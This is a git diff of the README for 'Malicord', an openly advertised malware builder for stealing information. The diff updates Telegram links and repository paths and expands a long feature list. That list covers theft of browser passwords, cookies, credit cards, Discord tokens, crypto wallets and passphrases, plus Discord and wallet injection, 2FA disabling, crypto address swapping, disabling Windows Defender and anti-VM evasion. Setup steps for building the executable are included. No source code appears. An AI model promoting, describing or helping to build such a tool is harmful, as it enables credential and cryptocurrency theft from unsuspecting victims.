@@ -5,7 +5,9 @@
 <h1 align="center">
   Malicord
 </h1>
-
+<p align="center">
+  Telegram server: https://t.me/+xM8hLV4lre81YjI8
+ </p>
 <p align="center"> 
   <kbd>
 <img src="https://i.redd.it/9vfqb0o839o91.png" width="328"></img>
@@ -13,14 +15,11 @@
 </p>
 
 <p align="center">
-<img src="https://img.shields.io/github/last-commit/KSCH-58/Malicord?style=flat">
-<img src="https://img.shields.io/github/stars/KSCH-58/Malicord?color=brightgreen">
-<img src="https://img.shields.io/github/forks/KSCH-58/Malicord?color=brightgreen">
+<img src="https://img.shields.io/github/last-commit/Malicord/Malicord?style=flat">
+<img src="https://img.shields.io/github/stars/Malicord/Malicord?color=brightgreen">
+<img src="https://img.shields.io/github/forks/Malicord/Malicord?color=brightgreen">
 </p>
 
-<p align="center">
-  Telegram server: https://t.me/Sordeal
- </p>
 
 ## <a id="content"></a>🌐 〢 Content
 
@@ -40,13 +39,12 @@
 ## <a id="setup"></a> 📁 〢 Setting up
 
 0. Install [Nodejs V18.5.0](https://nodejs.org/dist/v18.15.0/node-v18.15.0-x64.msi)
-1. Install [VisualStudio](https://visualstudio.microsoft.com/de/thank-you-downloading-visual-studio/?sku=Community&channel=Release&version=VS2022&source=VSLandingPage&passive=false&cid=2030)
-2. Install "Desktop development with C++" workload
-3. Install [Files](https://github.com/KSCH-58/Malicord/archive/refs/heads/main.zip)
-4. Install all modules [install.bat](https://github.com/KSCH-58/Malicord/blob/main/install.bat)
-5. Click on [start.bat](https://github.com/KSCH-58/Malicord/blob/main/start.bat)
-6. Complete the configuration
-7. You have your .exe file enjoy
+1. Install [VisualStudio developpement desktop c+++](https://visualstudio.microsoft.com/de/thank-you-downloading-visual-studio/?sku=Community&channel=Release&version=VS2022&source=VSLandingPage&passive=false&cid=2030)
+2. Install [Files](https://github.com/Malicord/Malicord/archive/refs/heads/main.zip)
+3. Install all modules [install.bat](https://github.com/Malicord/Malicord/blob/main/install.bat)
+4. Click on [start.bat](https://github.com/Malicord/Malicord/blob/main/start.bat)
+5. Complete the configuration
+6. You have your .exe file enjoy
 
 <a id="features"></a>
 
@@ -54,75 +52,98 @@
 
 ### ⚔️ 〢 Features
 
-🔮 = PREMIUM JOIN TELEGRAM
+🔮 = JOIN TELEGRAM
 
 ```diff
 > Default:
-- Steal Steam Files/Sessions
-- Steal Epicgame Files
-- Steal Ubisoft Files
-- Steal Growtopia Files
-- Steal Roblox Files/Sessions
-- Steal Minecraft Files/Sessions
-- Steal NationGlory login
-- Add a Fake error
-- Steal Chrome Passwords / Cookies / History / Autofill / Download
-- Steal all Browsers Passwords and Cookies for OperaGX/Opera/Chrome/Brave/Chromium/Torch/Edge/Mozilla and others
-- Systeme Informations
-- Steal WinSCP | Filezilla | Putty | Shadow | TotalCommander
-- Steal AntiVirus Detected
-- Debug Killer (Kill task gestionary)
-- Bypass TokenProtector / BetterDiscord
+Sample Features (81):
+- Check internet Connexion Before Stealing
+- Anti Spam (🔮)
+- Steal Epicgame
+- Steal Growtopia
+- Steal Wallets App
+- Steal Wallet Extensions
+- Bypass TokenProtector
+- Bypass BetterDiscord 
+- Inject Into Exodus
+- Inject Into Atomic
+- Inject Into Discord
+- Crypto Address Swaper (🔮)
+- Discord Token Grabber (for all apps)
+- Steal Launcher battlenet 
+- Steal EpicGames 
+- Steal RiotGames
+- Steal System Informations
+- Anti Debug | Anti Firewall (🔮) | Anti-VM
+- Debug Killer (Kill task gestionary/CMD)
 - Take a Screenshot
-- Grabb System Informations
-- Steal Latest Clipboard
-- Bypass Virus Total machines
-- Bypass VM machines
-- Hide Itself in Background
-- Replace the BTC address copying by your
+- Add iself to startup (🔮)
+- Steal Ubisoft
+- Steal NationGlory login
+- Steal NordVPN Files
+- Steal OpenVPN Files
+- Steal ProtonVPN Files
+- Steal Exodus | Metamask Passphrase & password (🔮)
+- Steal Roblox cookies 
+- Open a Fake Error 
+- Parse All Bots & Guilds owner|admin & UHQ Friends (🔮)
+- Exodus & Atomic injection
+- Steal Sensitives Files
+- Steal Passwords/cookies/credits cards/autofill
+- Steal WinSCP Login
+- Steal Filezilla recent servers
+- Steal Putty recent servers
+- Steal Shadow Access
+- Steal TotalCommander recent servers
+- Steal Telegram Files
+- Steal Pigdin Files
+- Steal Tox Files
+- Steal ICQ Files 
+- Steal Webcam Picture
+- Discord 2FA disabler (injection) (🔮)
+- Disable Discord Email notification (injection) (🔮)
+- Auto Discord Mail Changer (injection) (🔮)
+- upload on transfer if gofile is down (🔮)
+- chrome injection steal cookies/history/keylogger (snipe passwords & steam guard) (🔮)
+- steal in other disk usb/network 
+- ask admin with "CMD.exe" name + verified editor (🔮)
+- Steal antivirus installed 
+- Disable task manager (🔮)
+- Disable Windows defender (🔮)
+- Chromium based browsers Extensions Injector
+- get potential passwords discord
+- Steal Minecraft Files
+- Steal Steam Files
+
+
+Sessions Stealed & detailed (6):
++ Minecraft Sessions, Twitter Sessions, Steam Session, Instagram Sessions, Tiktok Sessions, Reddit Sessions, Roblox Sessions,
+
+Extensions Stealed (82):
++ Trust Wallet, Jaxx Liberty, Atomic Wallet, Electrum, Mycelium, Coinomi, GreenAddress, Edge, BRD, Samourai Wallet, Airbitz, Trezor, Ledger Live, Ledger Wallet, YubiKey, Digital Bitbox, Google Authenticator, Microsoft Authenticator, Authy, Duo Mobile, OTP Auth, Dashlane, FreeOTP, Aegis Authenticator, LastPass Auth, Keeper, RoboForm, KeePass, KeePassXC, Bitwarden, NordPass, LastPass, CommonKey, Splikity, MicrosoftAutofill, KeePass, KeePassXC, MYKI Password Manager, Browserpass, LastPass, RoboForm Manager, Metamask, Exodus, Sollet, Trezor Password Manager, GAuth Authenticator, EOS Authenticator, Authy, Authenticator, EO.Finance, TronLink, Coinbase, Jaxx Liberty, Guarda, Math, Binance, Nifty, Yoroi, EQUAL, BitApp, iwallet, Wombat, MEW CX, Guild, Ronin, NeoLine, Clover, Liquality, Terra Station, Keplr, Coin98, ZilPay, Hycon Lite Client, Nash, Steem Keychain, BitClip, DAppPlay, Auro, Polymesh, ICONex, Nabox, KHC, Temple, TezBox, Cyano, Byone, OneKey, Leaf, Dashlane, NordPass,
+
+Browsers Stealed (44) all profils:
++ Firefox, Waterfox, Cyberfox, BlackHaw, IceDragon, Pale Moon, Thunderbird, Seamonkey, Iridium, Yandex, Vivaldi, Uran, KMelon, Maxthon3, liebao, Coowon, Sleipnir5, ChromePlus, Superbird, Rafotech, SaferTechnologies, Suhba, TorBrowser, ElementsBrowser, CocCoc, GoBrowser, QIP Surf, RockMelt, Nichrome, Bromium, Comodo, Xpom, Chedot, 360Browser, Opera, OperaGX, EpicPrivacy, ChromeSxS, Sputnik, 7Star, CentBrowser, Orbitum, Kometa, Torch, Amigo
+
+Apps Wallets Stealed (10):
++ Zcash, Armory, ByteCoin, Ethereum, Jaxx, Atomic Wallet, Guarda, Coinomi, Exodus, Binance
+
+Build Bot Features (9):
+- Bind another exe inside (🔮)
 - Customize your app description
 - Customize your app name
+- Customize your file version (🔮)
+- Customize your app compagny name (🔮)
 - Customize your app license
-- Steal Wifi Password
-- Steal Screenshot
-- Steal Webcam
-- Chrome Extensions Injector
-- 0/64 Detect Virus Total Builder (.exe)
-- Steal Sensitive Files exodus login / a2f backup codes / tokens / passwords... (can be customizable)
-- Steal Wallets App: Zcash, Armory, ByteCoin, Ethereum, Jaxx, Atomic Wallet, Guarda, Coinomi
-- Steal Wallets Extensions: Exodus, Metamask
-- Inject Into Exodus
-- Inject Discord / Discord Canary / Lightcord (🔮) / Ripcord (🔮) / Xcord (🔮)
-- GUI builder (🔮)
-- Inject Into Atomic (🔮)
-- Crypto address swaper (🔮)
-- Customize Fake Error (🔮)
-- Add to startup (🔮)
 - Customize your app author (🔮)
 - Customize your app icon (🔮)
 - Customize your Copyright (🔮)
-- Customize your file version (🔮)
-- Customize your app compagny name (🔮)
-- Custom Installer / Setuper (🔮)
-- Bind an another .exe inside your grabber (🔮)
-
-
-> Extensions Stealed:
-Exodus, Metamask, Sollet, Trezor Password Manager, GAuth Authenticator, EOS Authenticator, Authy, 
-Authenticator, EO.Finance, TronLink, Coinbase, Jaxx Liberty, Guarda, Math, Binance, Nifty, Yoroi, 
-EQUAL, BitApp, iwallet, Wombat, MEW CX, Guild, Ronin, NeoLine, Clover, Liquality, Terra Station, 
-Keplr, Coin98, ZilPay, Hycon Lite Client, Nash, Steem Keychain, BitClip, DAppPlay, Auro, Polymesh, 
-ICONex, Nabox, KHC, Temple, TezBox, Cyano, Byone, OneKey, Leaf, Dashlane, NordPass, BitWarden
-
-> Wallets App:
-Zcash, Armory, ByteCoin, Ethereum, Jaxx, Atomic Wallet, Guarda, Coinomi
-
 
 > Injection Discord:
 - Automail Changer (🔮)
 - a2f remover (🔮)
 - Backups codes
-- Nitro Auto Buy
+- Nitro Auto Buy  (🔮)
 - First Start Reporter
 - New Passwords
 - New Emails
@@ -132,10 +153,16 @@ Zcash, Armory, ByteCoin, Ethereum, Jaxx, Atomic Wallet, Guarda, Coinomi
 - Anti Delete system (re install after Discord uninstall /  Bypass Discord Update)
 
 
+> Injection Atomic:
+- Passwords From login
+- Files
+- New Passphrase (🔮)
+
+
 > Injection Exodus:
 - Passwords From login
 - Files
-- New Passphrase
+- New Passphrase (🔮)
 
 > Injection Chrome:
 - Re install Discord Injection
@@ -149,13 +176,19 @@ Zcash, Armory, ByteCoin, Ethereum, Jaxx, Atomic Wallet, Guarda, Coinomi
 > + More!
 ```
 
+
 ### <a id="preview"></a>👁️ 〢 Preview
 
-<img title="" src="https://raw.githubusercontent.com/KSCH-58/cerf/main/assets/E3JZKJvEye.png" alt="" width="539">
-<img title="" src="https://raw.githubusercontent.com/KSCH-58/cerf/main/assets/CvfWVzDVG3.png" alt="" width="539">
+<img title="" src="https://raw.githubusercontent.com/KSCH-58/sub/main/assets/Discord_oIft7C46Sm.png" alt="" width="639">
+<img title="" src="https://raw.githubusercontent.com/KSCH-58/sub/main/assets/Discord_jhcfZCItAO.png" alt="" width="639">
 
-<img title="" src="https://raw.githubusercontent.com/KSCH-58/cerf/main/assets/UMhjoDF5GK.png" alt="" width="639">
+<img title="" src="https://raw.githubusercontent.com/KSCH-58/sub/main/assets/Discord_1jkJB3yAWX.png" alt="" width="539">
+<img title="" src="https://raw.githubusercontent.com/KSCH-58/sub/main/assets/Discord_LFxsujL7JP.png" alt="" width="539">
 
+<img title="" src="https://raw.githubusercontent.com/KSCH-58/sub/main/assets/Discord_N8Qz9JN9Cm.png" alt="" width="639">
+
+<img title="" src="https://raw.githubusercontent.com/KSCH-58/sub/main/assets/Discord_OteanFWy4t.png" alt="" width="639">
+<img title="" src="https://raw.githubusercontent.com/KSCH-58/sub/main/assets/Discord_Zai2DcZvZJ.png" alt="" width="639">
 
 <a id="todo"></a>
 
